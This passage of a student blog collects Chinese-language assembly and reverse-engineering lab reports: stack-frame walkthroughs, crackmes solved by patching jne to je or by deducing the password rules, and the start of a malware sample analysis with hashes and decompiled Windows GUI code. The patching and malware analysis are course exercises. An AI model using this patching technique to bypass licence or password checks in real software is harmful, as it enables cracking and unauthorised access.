<h3 id="fun-函数栈帧"><a href="#fun-函数栈帧" class="headerlink" title="fun 函数栈帧"></a>fun 函数栈帧</h3><blockquote>
<p>函数栈帧详解<a class="link"   href="https://blog.csdn.net/qq_41412237/article/details/119489211#/" >https://blog.csdn.net/qq_41412237/article/details/119489211#/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</blockquote>
<ol>
<li><p><code>endbr64</code>: 可能是一个保留指令，用于指示 64 位代码段的开头。</p>
</li>
<li><p><code>push rbp</code>: 将当前栈底指针 <code>rbp</code> 的值压入栈中，准备建立栈帧。</p>
</li>
<li><p><code>mov rbp, rsp</code>: 设置栈底指针 <code>rbp</code> 的值为当前栈顶指针 <code>rsp</code> 的值，建立栈帧。</p>
</li>
<li><p><code>sub rsp, 0x10</code>: 分配 16 字节的空间给局部变量。</p>
</li>
<li><p><code>mov esi, 4</code>: 将立即数 4 移入寄存器 esi 中。</p>
</li>
<li><p><code>mov edi, 3</code>: 将立即数 3 移入寄存器 edi 中。</p>
</li>
<li><p><code>call hello_fun</code>: 调用名为 hello_fun 的函数。</p>
</li>
<li><p><code>mov [rbp-4], eax</code>: 将函数返回值保存到栈帧中的位置。</p>
</li>
<li><p><code>mov eax, [rbp-4]</code>: 将之前保存在栈帧中的函数返回值移入 eax 寄存器。</p>
</li>
<li><p><code>mov esi, eax</code>: 将 eax 寄存器中的值移入 esi 寄存器。</p>
</li>
<li><p><code>lea rax, [rel 0x6361e9cc0004]</code>: 将相对地址 0x6361e9cc0004 加载到 rax 寄存器中。</p>
</li>
<li><p><code>mov rdi, rax</code>: 将 rax 中的值移入 rdi 寄存器。</p>
</li>
<li><p><code>mov eax, 0</code>: 将 0 移入 eax 寄存器。</p>
</li>
<li><p><code>call 0x6361e9cbf050</code>: 调用地址 0x6361e9cbf050 处的函数。</p>
</li>
<li><p><code>mov eax, 0</code>: 将 0 移入 eax 寄存器。</p>
</li>
<li><p><code>leave</code>: 恢复栈帧。</p>
</li>
<li><p><code>ret</code>: 返回。</p>
</li>
</ol>
<h2 id="hello-32-exe"><a href="#hello-32-exe" class="headerlink" title="hello_32.exe"></a>hello_32.exe</h2><h3 id="汇编-1"><a href="#汇编-1" class="headerlink" title="汇编"></a>汇编</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/4/image-20240322233340807.png"
                      alt="image-20240322233340807"
                ></p>
<h3 id="fun-函数栈帧-1"><a href="#fun-函数栈帧-1" class="headerlink" title="fun 函数栈帧"></a>fun 函数栈帧</h3><p>根据提供的汇编代码，下面是对 <code>fun</code> 函数栈帧的分析：</p>
<ol>
<li><p><code>push ebp</code>: 将旧的基址指针（ebp）压入栈中，保存调用函数前的堆栈帧。</p>
</li>
<li><p><code>mov ebp, esp</code>: 设置新的基址指针，将栈顶指针（esp）的值赋给 ebp，建立新的堆栈帧。</p>
</li>
<li><p><code>sub esp, 0x10</code>: 为局部变量分配空间，预留 16 字节的空间。这些空间将用于存储局部变量。</p>
</li>
<li><p>在调用 <code>hello32!fun</code> 函数之前，我们没有看到其他的局部变量分配操作。因此，该函数可能只有少量的局部变量，而这些局部变量可以在前面的 <code>sub esp, 0x10</code> 中分配的空间内。</p>
</li>
<li><p><code>call hello32!fun</code>: 调用了名为 <code>hello32!fun</code> 的函数，这是对应 <code>fun</code> 函数的调用。</p>
</li>
<li><p><code>add esp, 8</code>: 调整栈指针，释放之前压入栈中的两个参数，这表明函数调用时传递了两个参数。</p>
</li>
<li><p><code>mov [ebp-0xc], eax</code>: 将 <code>eax</code> 寄存器中的值存储到基址指针（ebp）偏移 <code>-0xc</code> 处。这可能是 <code>fun</code> 函数的返回值（eax）被存储的位置。</p>
</li>
<li><p><code>sub esp, 8</code>: 为新的参数和调用准备空间。通常，这种指令用于为函数调用的参数分配空间。</p>
</li>
<li><p><code>push dword [ebp-0xc]</code>: 将基址指针（ebp）偏移 <code>-0xc</code> 处的值压入栈中，这很可能是为了将 <code>fun</code> 函数的返回值作为参数传递给后续的函数调用。</p>
</li>
</ol>
<hr>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/4/lQLPJwuhiLwnRR3NBdPNBPuwple8ntYSli4F61lp5mJ0AA_1275_1491.png"
                      alt="lQLPJwuhiLwnRR3NBdPNBPuwple8ntYSli4F61lp5mJ0AA_1275_1491"
                ></p>
]]></content>
      <categories>
        <category>QFNU</category>
        <category>汇编语言与逆向工程</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
        <tag>逆向工程</tag>
        <tag>QFNU</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言与逆向工程实验报告7</title>
    <url>/posts/f579b246.html</url>
    <content><![CDATA[<h1 id="汇编语言与逆向工程实验报告-7"><a href="#汇编语言与逆向工程实验报告-7" class="headerlink" title="汇编语言与逆向工程实验报告 7"></a>汇编语言与逆向工程实验报告 7</h1><h2 id="文件信息"><a href="#文件信息" class="headerlink" title="文件信息"></a>文件信息</h2><p>首先看一下文件信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/7/image-20240408205656506.png"
                      alt="image-20240408205656506"
                ></p>
<p>可以看到是 32 位程序</p>
<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>定位到关键函数</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">check</span><span class="params">(<span class="type">char</span> *Str)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> Buffer; <span class="comment">// [esp+1Bh] [ebp-Dh] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> i; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+20h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+24h] [ebp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(Str); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    Buffer = Str[i];</span><br><span class="line">    <span class="built_in">sscanf</span>(&amp;Buffer, <span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">    v4 += v5;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">15</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Password OK!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Password Incorrect!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到函数 <code>check</code> 接收一个字符串 <code>Str</code> 作为参数，然后循环遍历字符串，将每个字符转换为整数，并累加到变量 <code>v4</code> 中。如果 <code>v4</code> 等于 15，则打印 <code>Password OK!</code> 并退出程序，否则打印 <code>Password Incorrect!</code> 并返回。</p>
<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>找到 password ok 字符串</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/7/image-20240408210918661.png"
                      alt="image-20240408210918661"
                ></p>
<p>函数改成 jne 改成 je，意思就是把原来的输出错误的条件改成输出正确的条件，这样就会一直输出 OK</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/7/image-20240408210951100.png"
                      alt="image-20240408210951100"
                ></p>
<p>打补丁导出</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/7/image-20240408211123589.png"
                      alt="image-20240408211123589"
                ></p>
<p>实现任意输入都输出 password ok</p>
<blockquote>
<p>相关链接</p>
<p><a class="link"   href="https://bbs.kanxue.com/thread-275779.htm#msg_header_h2_0" >[原创]x64dbg 使用记录：开始调试并修改一个程序<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://zhuanlan.zhihu.com/p/146616644#/" >x64dbg 入门系列（二）-搜索字符串<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/kinghzking/article/details/122476471#/" >[x64dbg] 实战 01 - 参数打印&#x2F;修改参数内容（条件断点、命令、脚本）<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/qq_44275213/article/details/107835055#/" >x32dbg&#x2F;x64dbg 修改后如何保存到 exe<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a href="https://blog.csdn.net/qq_16774199/article/details/124509624#/">x86 汇编<em>JE、JNE、JCXZ 和 JECXZ 指令</em>笔记_34</a></p>
</blockquote>
]]></content>
      <categories>
        <category>QFNU</category>
        <category>汇编语言与逆向工程</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
        <tag>逆向工程</tag>
        <tag>QFNU</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言与逆向工程实验报告8</title>
    <url>/posts/65c6afd7.html</url>
    <content><![CDATA[<p>在线浏览: <a href="https://blog.w1ndys.top/posts/65c6afd7">https://blog.w1ndys.top/posts/65c6afd7</a></p>
<h2 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h2><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">80</span>]; <span class="comment">// [rsp+10h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Whats the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v6);</span><br><span class="line">  v3 = check1(v6);</span><br><span class="line">  v4 = check2(v6) * v3;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)(v4 * check3(v6)) &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Nope, try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="check1"><a href="#check1" class="headerlink" title="check1()"></a>check1()</h2><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">check1</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1[i] &lt;= <span class="number">47</span> || a1[i] &gt; <span class="number">57</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/8/image-20240418184759191.png"
                      alt="image-20240418184759191"
                ></p>
<p>check1() 函数检查输入的密码是否全部为数字。</p>
<h2 id="check2"><a href="#check2" class="headerlink" title="check2()"></a>check2()</h2><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">check2</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1) - <span class="number">1</span>; ++i )</span><br><span class="line">    v2 += a1[i];</span><br><span class="line">  <span class="keyword">if</span> ( (v2 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFFL</span>L;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/8/image-20240418184834522.png"
                      alt="image-20240418184834522"
                ></p>
<p>check2() 函数检查输入的密码，除去最后一位之后前面的和是不是偶数。</p>
<h2 id="check3"><a href="#check3" class="headerlink" title="check3()"></a>check3()</h2><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">check3</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="built_in">strlen</span>(a1) &amp; <span class="number">1</span>) != <span class="number">0</span> || <span class="built_in">strlen</span>(a1) &lt;= <span class="number">4</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1) &gt;&gt; <span class="number">1</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = a1[i];</span><br><span class="line">    <span class="keyword">if</span> ( v2 != a1[i + (<span class="built_in">strlen</span>(a1) &gt;&gt; <span class="number">1</span>)] + <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/8/image-20240418184846492.png"
                      alt="image-20240418184846492"
                ></p>
<p>check3() 函数检查输入的密码，前半部分是否等于后半部分加 4。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本次实验中，我们实现了三个密码检查函数，分别是 check1()、check2() 和 check3()。check1() 函数检查输入的密码是否全部为数字，check2() 函数检查输入的密码，除去最后一位之后前面的和是不是偶数，check3() 函数检查输入的密码，前半部分是否等于后半部分加 4。</p>
<p>所以输入密码符合前面提到的三个情况即可</p>
]]></content>
      <categories>
        <category>QFNU</category>
        <category>汇编语言与逆向工程</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
        <tag>逆向工程</tag>
        <tag>QFNU</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言与逆向工程实验报告9 &amp;&amp; 期中测验</title>
    <url>/posts/b681040b.html</url>
    <content><![CDATA[<h1 id="逆向病毒"><a href="#逆向病毒" class="headerlink" title="逆向病毒"></a>逆向病毒</h1><h2 id="文件基础信息"><a href="#文件基础信息" class="headerlink" title="文件基础信息"></a>文件基础信息</h2><table>
<thead>
<tr>
<th>属性</th>
<th>值</th>
</tr>
</thead>
<tbody><tr>
<td>crc32</td>
<td>8C1CE91C</td>
</tr>
<tr>
<td>md5</td>
<td>73c297f059dd94671ca4e4c7dbfa6241</td>
</tr>
<tr>
<td>sha1</td>
<td>f9d5e6003715fbe3ccdf78a8bef866ebc876c85f</td>
</tr>
<tr>
<td>sha256</td>
<td>dcb8531b0879d46949dd63b1ac094f5588c26867805d0795e244f4f9b8077ed1</td>
</tr>
<tr>
<td>sha512</td>
<td>48db5c5b73bd824bf2ec3b398aea73c6ec93f519efcdc1528d8a91f32dcdbb428f539e6cb031416c8a2f551ec089993dd71a8bdae6530dd82bd4293e759dd402</td>
</tr>
<tr>
<td>ssdeep</td>
<td>1536:rUUBxlaaqYV&#x2F;VnvjIM3S9r8DzeEn5gairxh:DMbYkgjn5Qrf</td>
</tr>
<tr>
<td>type</td>
<td>PE32 executable (GUI) Intel 80386, for MS Windows</td>
</tr>
</tbody></table>
<h2 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h2><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// WinMain 入口函数</span></span><br><span class="line"><span class="type">int</span> __stdcall <span class="title function_">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, <span class="type">int</span> nShowCmd)</span></span><br><span class="line">&#123;</span><br><span class="line">  HWND Window; <span class="comment">// 窗口句柄</span></span><br><span class="line">  HWND v5; <span class="comment">// 加速器句柄</span></span><br><span class="line">  HACCEL AcceleratorsA; <span class="comment">// 加速器表</span></span><br><span class="line">  <span class="type">void</span> *v7; <span class="comment">// 内存分配指针</span></span><br><span class="line">  <span class="type">void</span> *v8; <span class="comment">// 用于释放内存的指针</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tagMSG</span> <span class="title">Msg</span>;</span> <span class="comment">// 消息结构体</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 加载窗口名称和类名</span></span><br><span class="line">  LoadStringA(hInstance, <span class="number">0x67u</span>, WindowName, <span class="number">100</span>);</span><br><span class="line">  LoadStringA(hInstance, <span class="number">0x6Du</span>, ClassName, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 执行某些初始化或设置操作</span></span><br><span class="line">  sub_402920();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将全局 hInstance 设置为传入的 hInstance</span></span><br><span class="line">  ::hInstance = hInstance;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 创建窗口</span></span><br><span class="line">  Window = CreateWindowExA(<span class="number">0</span>, ClassName, WindowName, <span class="number">0xCF0000u</span>, <span class="number">0x80000000</span>, <span class="number">0</span>, <span class="number">0x80000000</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, hInstance, <span class="number">0</span>);</span><br><span class="line">  v5 = Window;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果窗口创建失败，则返回 0</span></span><br><span class="line">  <span class="keyword">if</span> (!Window)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 显示窗口</span></span><br><span class="line">  ShowWindow(Window, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 更新窗口</span></span><br><span class="line">  UpdateWindow(v5);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 加载加速器表</span></span><br><span class="line">  AcceleratorsA = LoadAcceleratorsA(hInstance, (LPCSTR)<span class="number">0x6D</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 分配一块内存，但立即释放</span></span><br><span class="line">  v7 = <span class="built_in">malloc</span>(<span class="number">0x5F5E100u</span>);</span><br><span class="line">  v8 = v7;</span><br><span class="line">  <span class="keyword">if</span> (v7)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(v7, <span class="number">0</span>, <span class="number">0x5F5E100u</span>);</span><br><span class="line">    <span class="built_in">free</span>(v8);</span><br><span class="line">    <span class="comment">// 执行某些清理操作</span></span><br><span class="line">    sub_401130();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 进入消息循环</span></span><br><span class="line">  <span class="keyword">while</span> (GetMessageA(&amp;Msg, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 如果消息是加速器消息，则翻译并执行对应的命令</span></span><br><span class="line">    <span class="keyword">if</span> (!TranslateAcceleratorA(Msg.hwnd, AcceleratorsA, &amp;Msg))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 否则，将消息转换为字符消息，并分派给窗口过程函数处理</span></span><br><span class="line">      TranslateMessage(&amp;Msg);</span><br><span class="line">      DispatchMessageA(&amp;Msg);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 返回退出码</span></span><br><span class="line">  <span class="keyword">return</span> Msg.wParam;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="sub-402920"><a href="#sub-402920" class="headerlink" title="sub_402920"></a>sub_402920</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 注册窗口类的函数</span></span><br><span class="line"><span class="comment">// Parameters:</span></span><br><span class="line"><span class="comment">//   a1: 实例句柄，用于标识应用程序的实例</span></span><br><span class="line"><span class="comment">// Returns:</span></span><br><span class="line"><span class="comment">//   注册窗口类的原子值</span></span><br><span class="line">ATOM __usercall sub_402920@(HINSTANCE a1)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 定义一个窗口类结构体变量</span></span><br><span class="line">  WNDCLASSEXA v2; <span class="comment">// [esp+4h] [ebp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置结构体的大小</span></span><br><span class="line">  v2.cbSize = <span class="number">48</span>;</span><br><span class="line">  <span class="comment">// 设置窗口类的样式</span></span><br><span class="line">  v2.style = <span class="number">3</span>;</span><br><span class="line">  <span class="comment">// 设置窗口过程函数指针</span></span><br><span class="line">  v2.lpfnWndProc = sub_4029B0;</span><br><span class="line">  <span class="comment">// 设置额外的类空间</span></span><br><span class="line">  v2.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// 设置额外的窗口空间</span></span><br><span class="line">  v2.cbWndExtra = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// 设置窗口类所属的实例句柄</span></span><br><span class="line">  v2.hInstance = a1;</span><br><span class="line">  <span class="comment">// 加载大图标资源</span></span><br><span class="line">  v2.hIcon = LoadIconA(a1, (LPCSTR)<span class="number">0x6B</span>);</span><br><span class="line">  <span class="comment">// 加载光标资源</span></span><br><span class="line">  v2.hCursor = LoadCursorA(<span class="number">0</span>, (LPCSTR)<span class="number">0x7F00</span>);</span><br><span class="line">  <span class="comment">// 设置窗口背景画刷句柄</span></span><br><span class="line">  v2.hbrBackground = (HBRUSH)<span class="number">6</span>;</span><br><span class="line">  <span class="comment">// 设置菜单资源的 ID</span></span><br><span class="line">  v2.lpszMenuName = (LPCSTR)<span class="number">109</span>;</span><br><span class="line">  <span class="comment">// 设置窗口类名</span></span><br><span class="line">  v2.lpszClassName = ClassName;</span><br><span class="line">  <span class="comment">// 加载小图标资源</span></span><br><span class="line">  v2.hIconSm = LoadIconA(v2.hInstance, (LPCSTR)<span class="number">0x6C</span>);</span><br><span class="line">  <span class="comment">// 注册窗口类并返回结果</span></span><br><span class="line">  <span class="keyword">return</span> RegisterClassExA(&amp;v2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>这个函数注册了一个窗口</p>
<blockquote>
<p>下面再分析一下窗口过程函数</p>
</blockquote>
<h4 id="sub-4029B0"><a href="#sub-4029B0" class="headerlink" title="sub_4029B0"></a>sub_4029B0</h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 处理窗口消息的回调函数</span></span><br><span class="line">LRESULT __stdcall <span class="title function_">sub_4029B0</span><span class="params">(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tagPAINTSTRUCT</span> <span class="title">Paint</span>;</span> <span class="comment">// 绘制结构体</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果消息类型小于等于0xF，处理基本的系统消息</span></span><br><span class="line">  <span class="keyword">if</span> ( Msg &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( Msg )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 处理窗口重绘消息</span></span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xFu</span>:</span><br><span class="line">        BeginPaint(hWnd, &amp;Paint); <span class="comment">// 开始绘制</span></span><br><span class="line">        EndPaint(hWnd, &amp;Paint); <span class="comment">// 结束绘制</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 消息已处理，返回0</span></span><br><span class="line">      <span class="comment">// 处理定时器消息</span></span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        SetTimer(hWnd, <span class="number">1u</span>, <span class="number">0x1770u</span>, TimerFunc); <span class="comment">// 设置定时器</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 消息已处理，返回0</span></span><br><span class="line">      <span class="comment">// 处理窗口关闭消息</span></span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        PostQuitMessage(<span class="number">0</span>); <span class="comment">// 通知应用程序退出</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 消息已处理，返回0</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> DefWindowProcA(hWnd, Msg, wParam, lParam); <span class="comment">// 其他基本系统消息，调用默认处理函数</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果消息类型大于0xF，处理自定义应用程序消息</span></span><br><span class="line">  <span class="keyword">if</span> ( Msg != <span class="number">273</span> ) <span class="comment">// 检查是否是自定义消息</span></span><br><span class="line">    <span class="keyword">return</span> DefWindowProcA(hWnd, Msg, wParam, lParam); <span class="comment">// 不是自定义消息，调用默认处理函数</span></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int16)wParam == <span class="number">104</span> ) <span class="comment">// 自定义消息值为104</span></span><br><span class="line">  &#123;</span><br><span class="line">    DialogBoxParamA(hInstance, (LPCSTR)<span class="number">0x67</span>, hWnd, DialogFunc, <span class="number">0</span>); <span class="comment">// 弹出对话框</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 消息已处理，返回0</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int16)wParam == <span class="number">105</span> ) <span class="comment">// 自定义消息值为105</span></span><br><span class="line">  &#123;</span><br><span class="line">    DestroyWindow(hWnd); <span class="comment">// 销毁窗口</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 消息已处理，返回0</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> DefWindowProcA(hWnd, <span class="number">0x111u</span>, wParam, lParam); <span class="comment">// 其他自定义消息，调用默认处理函数</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="sub-401130"><a href="#sub-401130" class="headerlink" title="sub_401130"></a>sub_401130</h3><p><strong>这个函数是用来创建隐藏目录并复制一些文件</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_401130</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// dl</span></span><br><span class="line">  CHAR *v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// ecx</span></span><br><span class="line">  CHAR *v7; <span class="comment">// edx</span></span><br><span class="line">  BYTE *v8; <span class="comment">// ecx</span></span><br><span class="line">  CHAR *v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">bool</span> v10; <span class="comment">// cf</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v11; <span class="comment">// dl</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 